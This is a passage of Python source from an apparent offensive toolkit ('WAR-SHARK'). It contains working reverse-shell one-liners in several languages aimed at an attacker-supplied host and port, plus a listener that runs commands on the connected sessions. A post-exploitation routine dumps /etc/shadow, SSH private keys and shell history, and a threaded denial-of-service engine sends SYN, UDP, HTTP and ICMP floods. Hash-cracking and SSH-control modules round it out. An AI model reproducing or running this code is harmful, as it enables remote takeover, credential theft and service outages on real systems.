            'java': f"r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]);p.waitFor()",
            'socat': f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}",
            'telnet': f"TF=$(mktemp -u);mkfifo $TF;telnet {lhost} {lport} 0<$TF | /bin/sh 1>$TF",
            'golang': f"echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{lhost}:{lport}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
            'lua': f"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{lhost}','{lport}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
            'nodejs': f"(function(){{var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[]);var client=new net.Socket();client.connect({lport},\"{lhost}\",function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})();",
        }
        
        return shells.get(shell_type, shells['bash'])
    
    def start_listener(self, lport: int) -> Dict:
        """Start a listener for reverse shell connections"""
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(('0.0.0.0', lport))
            server.listen(5)
            
            listener_id = str(uuid.uuid4())[:8]
            
            def accept_connections():
                while True:
                    try:
                        client, addr = server.accept()
                        session_id = str(uuid.uuid4())[:8]
                        self.active_sessions[session_id] = {
                            'id': session_id,
                            'client': client,
                            'address': addr,
                            'created_at': datetime.now().isoformat()
                        }
                        print(f"\n{Colors.SUCCESS}✅ Reverse shell connected from {addr[0]}:{addr[1]}{Colors.RESET}")
                        print(f"   Session ID: {session_id}")
                    except:
                        break
            
            thread = threading.Thread(target=accept_connections, daemon=True)
            thread.start()
            
            self.reverse_shells[listener_id] = {
                'id': listener_id,
                'port': lport,
                'server': server,
                'running': True
            }
            
            return {
                'success': True,
                'listener_id': listener_id,
                'port': lport,
                'message': f'Listener started on port {lport}'
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def execute_on_session(self, session_id: str, command: str) -> Dict:
        """Execute a command on an active reverse shell session"""
        try:
            if session_id not in self.active_sessions:
                return {'success': False, 'error': 'Session not found'}
            
            session = self.active_sessions[session_id]
            client = session['client']
            
            client.send(f"{command}\n".encode())
            time.sleep(0.5)
            client.settimeout(5)
            
            try:
                response = client.recv(65535).decode('utf-8', errors='ignore')
            except:
                response = "[No response]"
            
            return {
                'success': True,
                'output': response,
                'session_id': session_id
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def privilege_escalation(self, session_id: str, method: str = "auto") -> Dict:
        """Attempt privilege escalation on a session"""
        escalation_commands = {
            'sudo': "sudo -l",
            'suid': "find / -perm -4000 -type f 2>/dev/null",
            'capabilities': "getcap -r / 2>/dev/null",
            'cron': "cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null",
            'passwd': "cat /etc/passwd 2>/dev/null",
            'shadow': "cat /etc/shadow 2>/dev/null",
            'kernel': "uname -a",
            'docker': "docker ps 2>/dev/null; ls -la /var/run/docker.sock 2>/dev/null",
            'nfs': "showmount -e 2>/dev/null; cat /etc/exports 2>/dev/null",
            'env': "env; cat /proc/self/environ 2>/dev/null",
            'network': "netstat -tulpn 2>/dev/null; ss -tulpn 2>/dev/null",
            'processes': "ps aux 2>/dev/null",
            'history': "cat ~/.bash_history 2>/dev/null; cat ~/.zsh_history 2>/dev/null",
            'ssh_keys': "ls -la ~/.ssh/ 2>/dev/null; cat ~/.ssh/id_rsa 2>/dev/null",
            'config_files': "find / -name '*.conf' -o -name '*.config' -o -name '*.cfg' 2>/dev/null | head -20"
        }
        
        if method == "auto":
            results = []
            for name, cmd in escalation_commands.items():
                result = self.execute_on_session(session_id, cmd)
                if result.get('success'):
                    results.append({'method': name, 'output': result.get('output', '')})
            return {'success': True, 'results': results}
        elif method in escalation_commands:
            return self.execute_on_session(session_id, escalation_commands[method])
        else:
            return {'success': False, 'error': f'Unknown escalation method: {method}'}
    
    def get_sessions(self) -> List[Dict]:
        """Get all active sessions"""
        return [
            {
                'id': s['id'],
                'address': f"{s['address'][0]}:{s['address'][1]}",
                'created_at': s['created_at']
            }
            for s in self.active_sessions.values()
        ]

# =====================
# REVERSE ENGINEERING ENGINE
# =====================
class ReverseEngineeringEngine:
    """Reverse engineering toolkit for binary analysis"""
    
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.r2_path = config.get('reverse_engineering.radare2_path', 'radare2')
        self.objdump_path = config.get('reverse_engineering.objdump_path', 'objdump')
        self.ghidra_path = config.get('reverse_engineering.ghidra_path', '')
    
    def analyze_binary(self, binary_path: str, analysis_type: str = "basic") -> CommandResult:
        """Analyze a binary file using available tools"""
        start_time = time.time()
        job_id = str(uuid.uuid4())[:8]
        
        self.db.save_reverse_engineering_job(job_id, binary_path, analysis_type)
        
        try:
            if not os.path.exists(binary_path):
                return CommandResult(False, f"Binary not found: {binary_path}", 0, "File not found")
            
            results = []
            
            file_result = subprocess.run(['file', binary_path], capture_output=True, text=True, timeout=30)
            results.append(f"=== File Info ===\n{file_result.stdout}")
            
            strings_result = subprocess.run(['strings', '-n', '8', binary_path], capture_output=True, text=True, timeout=60)
            strings_output = strings_result.stdout[:2000]
            results.append(f"\n=== Strings (first 2000 chars) ===\n{strings_output}")
            
            if shutil.which(self.objdump_path):
                objdump_result = subprocess.run(
                    [self.objdump_path, '-d', binary_path],
                    capture_output=True, text=True, timeout=120
                )
                objdump_output = objdump_result.stdout[:3000]
                results.append(f"\n=== Disassembly (first 3000 chars) ===\n{objdump_output}")
            
            if shutil.which(self.r2_path) and analysis_type == "advanced":
                r2_cmd = f"{self.r2_path} -q -c 'aaa; afl; s main; pdf; exit' {binary_path}"
                r2_result = subprocess.run(r2_cmd, shell=True, capture_output=True, text=True, timeout=180)
                results.append(f"\n=== Radare2 Analysis ===\n{r2_result.stdout[:3000]}")
            
            if shutil.which('readelf'):
                readelf_result = subprocess.run(
                    ['readelf', '-a', binary_path],
                    capture_output=True, text=True, timeout=60
                )
                readelf_output = readelf_result.stdout[:2000]
                results.append(f"\n=== ELF Analysis (first 2000 chars) ===\n{readelf_output}")
            
            if shutil.which('nm'):
                nm_result = subprocess.run(['nm', binary_path], capture_output=True, text=True, timeout=60)
                results.append(f"\n=== Symbols ===\n{nm_result.stdout[:2000]}")
            
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=True,
                output='\n'.join(results),
                execution_time=execution_time,
                data={'job_id': job_id}
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    def extract_strings(self, binary_path: str, min_length: int = 4) -> CommandResult:
        """Extract strings from a binary file"""
        start_time = time.time()
        try:
            if not os.path.exists(binary_path):
                return CommandResult(False, f"Binary not found: {binary_path}", 0, "File not found")
            
            result = subprocess.run(
                ['strings', '-n', str(min_length), binary_path],
                capture_output=True, text=True, timeout=60
            )
            
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=True,
                output=result.stdout[:5000],
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    def disassemble(self, binary_path: str, function: str = None) -> CommandResult:
        """Disassemble a binary using objdump or radare2"""
        start_time = time.time()
        try:
            if not os.path.exists(binary_path):
                return CommandResult(False, f"Binary not found: {binary_path}", 0, "File not found")
            
            if shutil.which(self.objdump_path):
                cmd = [self.objdump_path, '-d', binary_path]
                if function:
                    cmd.extend(['--disassemble=' + function])
                
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            elif shutil.which(self.r2_path):
                r2_cmd = f"{self.r2_path} -q -c 'aaa; s {function or 'main'}; pdf; exit' {binary_path}"
                result = subprocess.run(r2_cmd, shell=True, capture_output=True, text=True, timeout=120)
            else:
                return CommandResult(False, "No disassembler available", 0, "Tools not found")
            
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout[:5000] + result.stderr[:1000],
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    def get_jobs(self) -> List[Dict]:
        """Get all reverse engineering jobs"""
        return self.db.get_reverse_engineering_jobs()

# =====================
# SSH MANAGER
# =====================
class SSHManager:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.connections: Dict[str, paramiko.SSHClient] = {}
    
    def is_available(self) -> bool:
        return PARAMIKO_AVAILABLE
    
    def add_connection(self, name: str, host: str, username: str,
                      password: str = None, key_path: str = None,
                      port: int = 22) -> SSHConnection:
        conn_id = str(uuid.uuid4())[:8]
        conn = SSHConnection(
            id=conn_id,
            name=name,
            host=host,
            port=port,
            username=username,
            password=password,
            key_path=key_path,
            created_at=datetime.now().isoformat()
        )
        self.db.add_ssh_connection(conn)
        return conn
    
    def connect(self, conn_id: str) -> bool:
        if not self.is_available():
            return False
        
        rows = self.db.get_ssh_connections()
        conn_data = next((c for c in rows if c['id'] == conn_id), None)
        if not conn_data:
            return False
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            connect_kwargs = {
                'hostname': conn_data['host'],
                'port': conn_data['port'],
                'username': conn_data['username'],
                'timeout': 30
            }
            
            if conn_data['password_encrypted']:
                connect_kwargs['password'] = conn_data['password_encrypted']
            elif conn_data['key_path'] and os.path.exists(conn_data['key_path']):
                connect_kwargs['key_filename'] = conn_data['key_path']
            
            client.connect(**connect_kwargs)
            self.connections[conn_id] = client
            
            self.db.conn.execute(
                "UPDATE ssh_connections SET status = 'connected', last_used = CURRENT_TIMESTAMP WHERE id = ?",
                (conn_id,)
            )
            self.db.conn.commit()
            return True
        except Exception as e:
            print(f"SSH connection error: {e}")
            return False
    
    def disconnect(self, conn_id: str):
        if conn_id in self.connections:
            try:
                self.connections[conn_id].close()
                del self.connections[conn_id]
            except:
                pass
        
        self.db.conn.execute(
            "UPDATE ssh_connections SET status = 'disconnected' WHERE id = ?",
            (conn_id,)
        )
        self.db.conn.commit()
    
    def execute_command(self, conn_id: str, command: str, timeout: int = 30) -> CommandResult:
        start_time = time.time()
        
        if conn_id not in self.connections:
            if not self.connect(conn_id):
                return CommandResult(False, "", 0, "Not connected")
        
        client = self.connections[conn_id]
        
        try:
            stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            exit_code = stdout.channel.recv_exit_status()
            
            execution_time = time.time() - start_time
            
            self.db.log_ssh_command(conn_id, command, output, exit_code, execution_time)
            
            return CommandResult(
                success=exit_code == 0,
                output=output + ("\n" + error if error else ""),
                execution_time=execution_time,
                error=None if exit_code == 0 else error
            )
        except Exception as e:
            execution_time = time.time() - start_time
            return CommandResult(False, "", execution_time, str(e))
    
    def get_connections(self) -> List[Dict]:
        rows = self.db.get_ssh_connections()
        for row in rows:
            row['connected'] = row['id'] in self.connections
        return rows

# =====================
# TRAFFIC GENERATOR
# =====================
class TrafficGeneratorEngine:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.active_generators: Dict[str, TrafficGenerator] = {}
        self.stop_events: Dict[str, threading.Event] = {}
    
    def get_available_types(self) -> List[str]:
        return [t.value for t in TrafficType]
    
    def generate(self, traffic_type: str, target_ip: str, duration: int,
                port: int = None, packet_rate: int = 100) -> TrafficGenerator:
        try:
            ipaddress.ip_address(target_ip)
        except:
            raise ValueError(f"Invalid IP: {target_ip}")
        
        if port is None:
            port_map = {
                'http_get': 80, 'http_post': 80, 'https': 443,
                'dns': 53, 'tcp_syn': 80, 'tcp_connect': 80, 'udp': 53
            }
            port = port_map.get(traffic_type, 0)
        
        generator_id = f"{target_ip}_{traffic_type}_{int(time.time())}"
        
        generator = TrafficGenerator(
            id=generator_id,
            traffic_type=traffic_type,
            target_ip=target_ip,
            target_port=port,
            duration=duration,
            start_time=datetime.now().isoformat(),
            status="running"
        )
        
        stop_event = threading.Event()
        self.stop_events[generator_id] = stop_event
        
        thread = threading.Thread(
            target=self._run_generator,
            args=(generator, packet_rate, stop_event),
            daemon=True
        )
        thread.start()
        
        self.active_generators[generator_id] = generator
        return generator
    
    def _run_generator(self, generator: TrafficGenerator, packet_rate: int,
                      stop_event: threading.Event):
        start_time = time.time()
        end_time = start_time + generator.duration
        packets_sent = 0
        bytes_sent = 0
        interval = 1.0 / max(1, packet_rate)
        
        func = self._get_generator_func(generator.traffic_type)
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                size = func(generator.target_ip, generator.target_port)
                if size > 0:
                    packets_sent += 1
                    bytes_sent += size
                time.sleep(interval)
            except Exception as e:
                time.sleep(0.1)
        
        generator.packets_sent = packets_sent
        generator.bytes_sent = bytes_sent
        generator.end_time = datetime.now().isoformat()
        generator.status = "completed" if not stop_event.is_set() else "stopped"
        
        self.db.log_traffic(generator)
    
    def _get_generator_func(self, traffic_type: str):
        funcs = {
            'icmp': self._icmp,
            'tcp_syn': self._tcp_syn,
            'tcp_ack': self._tcp_ack,
            'tcp_connect': self._tcp_connect,
            'udp': self._udp,
            'http_get': self._http_get,
            'http_post': self._http_post,
            'https': self._https,
            'dns': self._dns,
            'arp': self._arp,
            'mixed': self._mixed,
            'random': self._random
        }
        return funcs.get(traffic_type, self._icmp)
    
    def _icmp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            else:
                subprocess.run(['ping', '-c', '1', '-W', '1', target],
                              capture_output=True, timeout=2)
                return 64
        except:
            return 0
    
    def _tcp_syn(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="S")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_ack(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="A")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_connect(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target, port))
            sock.close()
            return 40 if result == 0 else 0
        except:
            return 0
    
    def _udp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/UDP(dport=port)/b"WARSHARK"
                send(packet, verbose=False)
                return len(packet)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b"WARSHARK", (target, port))
                sock.close()
                return 64
        except:
            return 0
    
    def _http_get(self, target: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "WAR-SHARK"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _http_post(self, target: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("POST", "/", body="test=data",
                        headers={"User-Agent": "WAR-SHARK"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _https(self, target: str, port: int) -> int:
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(target, port, context=context, timeout=3)
            conn.request("GET", "/", headers={"User-Agent": "WAR-SHARK"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 200
        except:
            return 0
    
    def _dns(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            tid = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            query = b'\x06google\x03com\x00\x00\x01\x00\x01'
            packet = tid + flags + questions + b'\x00\x00\x00\x00\x00\x00' + query
            sock.sendto(packet, (target, port))
            sock.close()
            return len(packet)
        except:
            return 0
    
    def _arp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                local_mac = self._get_local_mac()
                packet = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target)
                sendp(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _mixed(self, target: str, port: int) -> int:
        funcs = [self._icmp, self._tcp_syn, self._udp, self._http_get]
        return random.choice(funcs)(target, port)
    
    def _random(self, target: str, port: int) -> int:
        types = ['icmp', 'tcp_syn', 'udp', 'http_get', 'dns']
        return self._get_generator_func(random.choice(types))(target, port)
    
    def _get_local_mac(self) -> str:
        try:
            mac = uuid.getnode()
            return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
        except:
            return "00:11:22:33:44:55"
    
    def stop(self, generator_id: str = None) -> bool:
        if generator_id:
            if generator_id in self.stop_events:
                self.stop_events[generator_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active(self) -> List[Dict]:
        return [
            {
                'id': g.id,
                'traffic_type': g.traffic_type,
                'target_ip': g.target_ip,
                'duration': g.duration,
                'packets_sent': g.packets_sent,
                'status': g.status
            }
            for g in self.active_generators.values()
        ]

# =====================
# NIKTO SCANNER
# =====================
class NiktoScanner:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.available = self._check_available()
    
    def _check_available(self) -> bool:
        return shutil.which('nikto') is not None
    
    def scan(self, target: str, options: Dict = None) -> Dict:
        start_time = time.time()
        options = options or {}
        
        if not self.available:
            return {'success': False, 'error': 'Nikto not installed'}
        
        try:
            timestamp = int(time.time())
            output_file = os.path.join(NIKTO_RESULTS_DIR, f"nikto_{target.replace('/', '_')}_{timestamp}.json")
            
            cmd = ['nikto', '-host', target, '-Format', 'json', '-o', output_file]
            if options.get('ssl'):
                cmd.append('-ssl')
            if options.get('port'):
                cmd.extend(['-port', str(options['port'])])
            if options.get('tuning'):
                cmd.extend(['-tuning', options['tuning']])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            scan_time = time.time() - start_time
            
            vulnerabilities = []
            if os.path.exists(output_file):
                try:
                    with open(output_file, 'r') as f:
                        data = json.load(f)
                        if isinstance(data, dict) and 'vulnerabilities' in data:
                            vulnerabilities = data['vulnerabilities']
                except:
                    pass
            
            self.db.log_nikto_scan(target, vulnerabilities, output_file, scan_time, result.returncode == 0)
            
            return {
                'success': result.returncode == 0,
                'target': target,
                'vulnerabilities': vulnerabilities,
                'scan_time': scan_time,
                'output_file': output_file
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Scan timed out'}
        except Exception as e:
            return {'success': False, 'error': str(e)}

# =====================
# DOS ATTACK ENGINE
# =====================
class DOSEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running_attacks: Dict[str, threading.Event] = {}
    
    def syn_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        return self._attack("syn", target_ip, port, duration, threads)
    
    def udp_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        return self._attack("udp", target_ip, port, duration, threads)
    
    def http_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        return self._attack("http", target_ip, port, duration, threads)
    
    def icmp_flood(self, target_ip: str, duration: int, threads: int = 50) -> Dict:
        return self._attack("icmp", target_ip, 0, duration, threads)
    
    def _attack(self, attack_type: str, target_ip: str, port: int, duration: int, threads: int) -> Dict:
        max_threads = self.config.get('dos.max_threads', 100)
        if threads > max_threads:
            return {'success': False, 'error': f'Threads exceed maximum ({max_threads})'}
        
        try:
            ipaddress.ip_address(target_ip)
        except:
            return {'success': False, 'error': f'Invalid IP: {target_ip}'}
        
        attack_id = f"{attack_type}_{target_ip}_{int(time.time())}"
        stop_event = threading.Event()
        self.running_attacks[attack_id] = stop_event
        
        packets_sent = 0
        
        def attack_thread():
            nonlocal packets_sent
            end_time = time.time() + duration
            func = self._get_attack_func(attack_type)
            
            while time.time() < end_time and not stop_event.is_set():
                try:
                    size = func(target_ip, port)
                    if size > 0:
                        packets_sent += 1
                except:
                    pass
        
        attack_threads = []
        for _ in range(threads):
            t = threading.Thread(target=attack_thread, daemon=True)
            t.start()
            attack_threads.append(t)
        
        def monitor():
            for t in attack_threads:
                t.join(timeout=duration + 2)
            self.db.log_dos_attack(attack_type, target_ip, port, duration, packets_sent, 'completed', 'system')
            if attack_id in self.running_attacks:
                del self.running_attacks[attack_id]
        
        threading.Thread(target=monitor, daemon=True).start()
        
        return {
            'success': True,
            'attack_id': attack_id,
            'type': attack_type,
            'target': target_ip,
            'port': port,
            'duration': duration,
            'threads': threads,
            'message': f"{attack_type.upper()} flood started on {target_ip}:{port} for {duration}s"
        }
    
    def _get_attack_func(self, attack_type: str):
        funcs = {
            'syn': self._send_syn,
            'udp': self._send_udp,
            'http': self._send_http,
            'icmp': self._send_icmp
        }
        return funcs.get(attack_type, self._send_udp)
    
    def _send_syn(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="S")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _send_udp(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = b"X" * 1024
            sock.sendto(data, (target, port))
            sock.close()
            return len(data) + 8
        except:
            return 0
    
    def _send_http(self, target: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=1)
            conn.request("GET", "/", headers={"User-Agent": "WAR-SHARK"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _send_icmp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def stop(self, attack_id: str = None) -> bool:
        if attack_id:
            if attack_id in self.running_attacks:
                self.running_attacks[attack_id].set()
                return True
        else:
            for event in self.running_attacks.values():
                event.set()
            return True
        return False
    
    def get_active(self) -> List[Dict]:
        return [
            {
                'id': attack_id,
                'type': attack_id.split('_')[0] if '_' in attack_id else 'unknown',
                'target': attack_id.split('_')[1] if '_' in attack_id else 'unknown'
            }
            for attack_id in self.running_attacks.keys()
        ]

# =====================
# DOMAIN HOSTING ENGINE
# =====================
class DomainHostingEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.hosted_domains = {}
        self.domain_to_ip = {}
    
    def translate_ip_to_domain(self, ip: str) -> Optional[str]:
        try:
            domain = self.db.resolve_ip(ip)
            if domain:
                return domain
            
            try:
                if DNS_AVAILABLE:
                    rev_name = dns.reversename.from_address(ip)
                    answers = dns.resolver.resolve(rev_name, "PTR")
                    if answers:
                        domain = str(answers[0]).rstrip('.')
                        return domain
            except:
                pass
            
            try:
                domain = socket.gethostbyaddr(ip)[0]
                if domain:
                    return domain
            except:
                pass
            
            return None
        except Exception as e:
            logger.error(f"IP to domain translation error: {e}")
            return None
    
    def translate_domain_to_ip(self, domain: str) -> Optional[str]:
        try:
            ip = self.db.resolve_domain(domain)
            if ip:
                return ip
            
            try:
                if DNS_AVAILABLE:
                    answers = dns.resolver.resolve(domain, "A")
                    if answers:
                        ip = str(answers[0])
                        return ip
            except:
                pass
            
            try:
                ip = socket.gethostbyname(domain)
                if ip:
                    return ip
            except:
                pass
            
            return None
        except Exception as e:
            logger.error(f"Domain to IP translation error: {e}")
            return None
    
    def host_domain(self, ip: str, domain: str, port: int = 8080) -> DomainHost:
        try:
            ipaddress.ip_address(ip)
            
            host_id = str(uuid.uuid4())[:8]
            hosting_path = os.path.join(DOMAIN_HOSTING_DIR, host_id)
            os.makedirs(hosting_path, exist_ok=True)
            
            domain_host = DomainHost(
                id=host_id,
                ip=ip,
                domain=domain,
                hosting_path=hosting_path,
                created_at=datetime.now().isoformat(),
                active=True
            )
            
            self.db.add_domain_host(domain_host)
            
            self.hosted_domains[domain] = {
                'ip': ip,
                'port': port,
                'path': hosting_path,
                'id': host_id
            }
            self.domain_to_ip[domain] = ip
            
            logger.info(f"Domain {domain} hosted on IP {ip}:{port}")
            return domain_host
        except Exception as e:
            logger.error(f"Domain hosting error: {e}")
            return None
    
    def host_website(self, domain: str, html_content: str) -> bool:
        try:
            if domain not in self.hosted_domains:
                return False
            
            domain_info = self.hosted_domains[domain]
            index_path = os.path.join(domain_info['path'], 'index.html')
            
            with open(index_path, 'w') as f:
                f.write(html_content)
            
            port = domain_info['port']
            threading.Thread(target=self._start_http_server, args=(domain_info['path'], port), daemon=True).start()
            
            logger.info(f"Website hosted on http://{domain}:{port}")
            return True
        except Exception as e:
            logger.error(f"Website hosting error: {e}")
            return False
    
    def _start_http_server(self, path: str, port: int):
        try:
            os.chdir(path)
            handler = http.server.SimpleHTTPRequestHandler
            with socketserver.TCPServer(("0.0.0.0", port), handler) as httpd:
                logger.info(f"Serving domain on port {port}")
                httpd.serve_forever()
        except Exception as e:
            logger.error(f"HTTP server error: {e}")
    
    def list_hosted_domains(self) -> List[Dict]:
        try:
            return self.db.get_domain_hosts()
        except Exception as e:
            logger.error(f"List domains error: {e}")
            return []
    
    def get_domain_ips(self) -> Dict[str, str]:
        try:
            rows = self.db.get_domain_hosts()
            return {row['domain']: row['ip'] for row in rows if row['active']}
        except Exception as e:
            logger.error(f"Get domain IPs error: {e}")
            return {}

# =====================
# CRACKING ENGINE
# =====================
class CrackingEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running_jobs = {}
        self.hashcat_path = config.get('cracking.hashcat_path', 'hashcat')
        self.wordlist_path = config.get('cracking.wordlist_path', os.path.join(WORDLISTS_DIR, "rockyou.txt"))
        self.default_hash_type = config.get('cracking.default_hash_type', 0)
    
    def crack_hash(self, hash_type: str, hash_value: str, wordlist: str = None) -> str:
        job_id = str(uuid.uuid4())[:8]
        wordlist = wordlist or self.wordlist_path
        
        self.db.save_cracking_job(job_id, hash_type, hash_value, wordlist)
        
        thread = threading.Thread(target=self._run_hashcat, args=(job_id, hash_type, hash_value, wordlist))
        thread.daemon = True
        thread.start()
        
        return job_id
    
    def _run_hashcat(self, job_id: str, hash_type: str, hash_value: str, wordlist: str):
        self.db.update_cracking_job(job_id, 'running')
        
        try:
            hash_type_num = self._get_hash_type_num(hash_type)
            
            cmd = [
                self.hashcat_path,
                '-m', str(hash_type_num),
                '-a', '0',
                '-o', os.path.join(CRACKING_DIR, f"{job_id}_result.txt"),
                '--potfile-path', os.path.join(CRACKING_DIR, f"{job_id}.pot"),
                hash_value,
                wordlist
            ]
            
            if not shutil.which(self.hashcat_path):
                result = self._crack_with_python(hash_type, hash_value, wordlist)
                if result:
                    self.db.update_cracking_job(job_id, 'completed', result, True)
                else:
                    self.db.update_cracking_job(job_id, 'failed', 'No match found', False)
                return
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            result_file = os.path.join(CRACKING_DIR, f"{job_id}_result.txt")
            if os.path.exists(result_file):
                with open(result_file, 'r') as f:
                    content = f.read().strip()
                    if ':' in content:
                        cracked = content.split(':', 1)[1]
                        self.db.update_cracking_job(job_id, 'completed', cracked, True)
                    else:
                        self.db.update_cracking_job(job_id, 'completed', content, True)
            else:
                self.db.update_cracking_job(job_id, 'failed', 'No result found', False)
                
        except subprocess.TimeoutExpired:
            self.db.update_cracking_job(job_id, 'failed', 'Timeout', False)
        except Exception as e:
            self.db.update_cracking_job(job_id, 'failed', str(e), False)
    
    def _get_hash_type_num(self, hash_type: str) -> int:
        hash_types = {
            'md5': 0, 'sha1': 100, 'sha256': 1400, 'sha512': 1700,
            'ntlm': 1000, 'md5_utf8': 10, 'sha1_utf8': 110,
            'sha256_utf8': 1410, 'sha512_utf8': 1710,
            'mysql': 200, 'mysql5': 300, 'postgres': 12,
            'mssql': 131, 'oracle': 3100, 'bcrypt': 3200,
            'scrypt': 8900, 'pbkdf2': 10900
        }
        return hash_types.get(hash_type.lower(), self.default_hash_type)
    
    def _crack_with_python(self, hash_type: str, hash_value: str, wordlist: str) -> Optional[str]:
        try:
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                for word in f:
                    word = word.strip()
                    if not word:
                        continue
                    
                    if hash_type.lower() == 'md5':
                        if hashlib.md5(word.encode()).hexdigest() == hash_value:
                            return word
                    elif hash_type.lower() == 'sha1':
                        if hashlib.sha1(word.encode()).hexdigest() == hash_value:
                            return word
                    elif hash_type.lower() == 'sha256':
                        if hashlib.sha256(word.encode()).hexdigest() == hash_value:
                            return word
                    elif hash_type.lower() == 'sha512':
                        if hashlib.sha512(word.encode()).hexdigest() == hash_value:
                            return word
            return None
        except:
            return None
    
    def get_job_status(self, job_id: str) -> Optional[Dict]:
        jobs = self.db.get_cracking_jobs()
        for job in jobs:
            if job['job_id'] == job_id:
                return dict(job)
        return None
    
    def get_all_jobs(self) -> List[Dict]:
        return self.db.get_cracking_jobs()

# =====================
# DOCKER SCANNER
# =====================
class DockerScanner:
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def scan_image(self, image: str) -> Dict:
        start_time = time.time()
        try:
            result = subprocess.run(['docker', 'scan', image], capture_output=True, text=True, timeout=300)
            scan_time = time.time() - start_time
            
            vulnerabilities = self._parse_vulnerabilities(result.stdout)
